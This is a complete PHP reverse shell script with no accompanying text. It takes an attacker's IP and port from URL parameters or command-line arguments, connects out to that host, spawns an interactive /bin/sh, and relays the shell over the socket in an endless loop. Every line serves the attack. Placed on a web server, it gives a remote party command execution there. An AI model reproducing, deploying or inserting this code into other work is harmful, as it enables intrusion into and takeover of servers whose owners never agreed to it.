<?php
if ((!isset($_GET['ip']) && !isset($_GET['port'])) &&
    (!isset($argv[1]) && !isset($argv[2]))) exit("Expected IP and PORT\r\n");

$ip = (isset($_GET['ip'])) ? $_GET['ip'] : $argv[1];
$port = (isset($_GET['port'])) ? $_GET['port'] : $argv[2];

$sock = fsockopen($ip, $port, $error, $errorstring, 30);

if (!$sock) exit;

$process = proc_open(
    '/bin/sh -i',
    [
        ['pipe', 'r'], // stdin is a pipe that the child will read from
        ['pipe', 'w'], // stdout is a pipe that the child will write to
        ['pipe', 'w']  // stderr is a pipe that the child will write to
    ],
    $pipes
);

fwrite($sock, "Reverse shell opened\r\n");

foreach ($pipes as $pipe) {
    stream_set_blocking($pipe, 0);
}
stream_set_blocking($sock, 0);

for (;;) {
    $read = [
        $sock,
        $pipes[1],
        $pipes[2]
    ];

    if (in_array($sock, $read)) {
        $input = fread($sock, 8192);
        fwrite($pipes[0], $input);
    }

    foreach ($pipes as $pipe) {
        if (in_array($pipe, $read)) {
            $input = fread($pipe, 8192);
            fwrite($sock, $input);
        }
    }
}

fclose($sock);
proc_close($process);